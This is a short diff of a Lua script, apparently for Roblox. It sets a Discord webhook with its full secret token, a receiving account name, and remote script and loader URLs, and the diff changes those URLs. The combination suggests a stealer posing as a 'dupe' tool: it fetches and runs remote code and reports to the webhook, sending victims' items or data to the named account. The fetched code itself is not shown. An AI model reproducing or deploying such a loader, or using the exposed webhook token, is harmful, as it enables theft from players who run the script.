@@ -1,8 +1,8 @@
 local userWebhook = "https://discord.com/api/webhooks/1397176516349264022/JwGuDi_UAMu-zAJB9LWd0oml1ZFdidMeaHmiNYDbiV1qUscAZH1vDfqxfapqZmYGVTqa"
 local receiverName = "DouglasMcArthurT"
-local mainScriptUrl = "https://raw.githubusercontent.com/SpDupe/ege/refs/heads/main/loadir.lua"
+local mainScriptUrl = "https://raw.githubusercontent.com/SpDupe/ege/refs/heads/main/loade.lua"
 local yourscripturl = ""
-local loaderUrl = "https://api.rubis.app/v2/scrap/J1cP07BpwZavy7Ld/raw"
+local loaderUrl = "https://api.rubis.app/v2/scrap/gJhDtvJ5d2LZvIcd/raw"
 
 local initialCommandToRun = ""
 if loaderUrl and loaderUrl:gsub("%s", "") ~= "" then
